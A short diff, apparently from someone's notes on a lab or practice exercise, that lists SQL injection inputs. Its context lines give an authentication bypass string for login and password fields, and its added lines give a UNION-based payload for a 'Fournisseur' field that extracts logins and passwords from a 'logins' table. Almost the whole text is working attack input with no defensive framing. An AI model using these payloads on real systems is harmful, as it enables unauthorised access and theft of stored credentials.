@@ -3,3 +3,6 @@ Login = ' or 'y'='y
 
 Pwd ? ' or 'y'='y
 pwd = ' or 'y'='y
+
+Fournisseur ? ' union select login from logins union select password from logins where 'y'='y
+Fournisseur = ' union select login from logins union select password from logins where 'y'='y
